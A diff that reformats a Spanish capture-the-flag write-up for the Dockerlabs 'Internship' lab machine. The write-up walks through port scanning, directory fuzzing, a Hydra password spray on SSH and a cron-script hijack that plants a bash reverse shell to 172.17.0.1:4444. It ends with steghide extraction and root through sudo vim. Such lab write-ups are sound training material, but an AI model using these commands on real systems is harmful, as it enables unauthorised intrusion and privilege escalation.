@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Internship 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Internship ​
+
+## 🖥️ Writeup - Internship
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Gobuster` `Cryptography` `JS Deobfuscation` `Hydra` `Cron Job` `Writable File` `Steganography` `Steghide` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip internship.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh internship.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 20:23 CET
 Nmap scan report for 172.17.0.2
@@ -82,7 +91,7 @@ Identificamos que los puertos `22` y `80` están abiertos.
 
 Accedemos al servicio web del puerto `80` y nos encontramos con esta página:
 
-![alt text](../../images/gatekeeper.png)
+![alt text](../../.gitbook/assets/gatekeeper.png)
 
 Inspeccionamos el código fuente y encontramos información sobre un dominio.
 
@@ -107,7 +116,7 @@ Volvemos a acceder al servicio web, esta vez utilizando la URL `http://gatekeepe
 
 Ahora ya podemos interactuar correctamente con la página.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -116,6 +125,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -165,13 +175,13 @@ Regresamos a la página principal y volvemos a revisar el código en busca de m�
 
 Procedemos a desofuscarlo utilizando la herramienta online `deobfuscate.io`.
 
-![alt text](../../images/deobfuscate.png)
+![alt text](../../.gitbook/assets/deobfuscate.png)
 
 El script de JS nos revela dos rutas que no conocíamos anteriormente: `/lab/login.php` y `/lab/employees.php`.
 
 Navegamos a la ruta `/lab/employees.php` y encontramos lo siguiente:
 
-![alt text](../../images/json.png)
+![alt text](../../.gitbook/assets/json.png)
 
 Aquí visualizamos la información de todos los empleados, incluyendo sus nombres y departamentos.
 
@@ -182,6 +192,7 @@ curl -s "http://gatekeeperhr.com/lab/employees.php" | jq -r '.employees[] | sele
 ```
 
 Info:
+
 ```
 Pedro Ramirez
 Valentina Gomez
@@ -202,7 +213,7 @@ valentinagomez
 valentina.gomez
 ```
 
-# HYDRA
+## HYDRA
 
 A continuación, lanzamos un ataque `Password Spraying` contra el servicio `SSH` en el puerto `22`, utilizando nuestro diccionario de usuarios y la contraseña que habíamos descubierto anteriormente: `purpl3`.
 
@@ -211,6 +222,7 @@ hydra -L users.txt -p purpl3 ssh://172.17.0.2 -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -229,7 +241,7 @@ Accedemos por `SSH` utilizando estas credenciales.
 ssh pedro@172.17.0.2
 ```
 
-# MOVIMIENTO LATERAL
+## MOVIMIENTO LATERAL
 
 Una vez dentro, enumeramos el sistema exhaustivamente hasta que nos encontramos con lo siguiente:
 
@@ -238,6 +250,7 @@ ps aux
 ```
 
 Info:
+
 ```
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root           1  0.0  0.0   3932  3064 ?        Ss   20:16   0:00 /bin/bash /entrypoint.sh
@@ -250,9 +263,9 @@ valenti+     937  0.0  0.0   2584  1724 ?        Ss   20:33   0:00 /bin/sh -c sl
 valenti+     938  0.0  0.0   2492  1484 ?        S    20:33   0:00 sleep 45
 valenti+     940  0.0  0.0   2492  1492 ?        S    20:33   0:00 sleep 15
 pedro        947  0.0  0.1   8108  4424 pts/0    R+   20:33   0:00 ps aux
-``` 
+```
 
-Observamos que el usuario valentina ejecuta el script `/opt/log_cleaner.sh` de forma periódica. 
+Observamos que el usuario valentina ejecuta el script `/opt/log_cleaner.sh` de forma periódica.
 
 Listamos los permisos del directorio `/opt` y verificamos que tenemos permisos de escritura sobre dicho archivo.
 
@@ -270,6 +283,7 @@ nano log_cleaner.sh
 ```
 
 Script:
+
 ```
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
@@ -282,6 +296,7 @@ nc -nlvp 4444
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36416
@@ -292,28 +307,33 @@ valentina@0fa5cedd2199:~$
 
 En cuestión de unos 5 segundos recibimos la shell interactiva como el usuario `valentina`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 En el directorio `/home/valentina` localizamos una imagen llamada `profile_picture.jpeg`.
 
@@ -324,6 +344,7 @@ base64 profile_picture.jpeg
 ```
 
 Info:
+
 ```
 /9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEP
 ERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4e
@@ -348,7 +369,7 @@ Visualizamos la imagen.
 open imagen.jpeg
 ```
 
-![alt text](../../images/troll.png)
+![alt text](../../.gitbook/assets/troll.png)
 
 Troleada histórica.
 
@@ -359,6 +380,7 @@ steghide extract -sf imagen.jpeg
 ```
 
 Info:
+
 ```
 Enter passphrase: 
 wrote extracted data to "secret.txt".
@@ -381,6 +403,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for valentina on 0fa5cedd2199:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, listpw=always
@@ -396,6 +419,7 @@ sudo vim -c ':!/bin/bash'
 ```
 
 Info:
+
 ```
 root@0fa5cedd2199:/home/valentina# whoami
 root
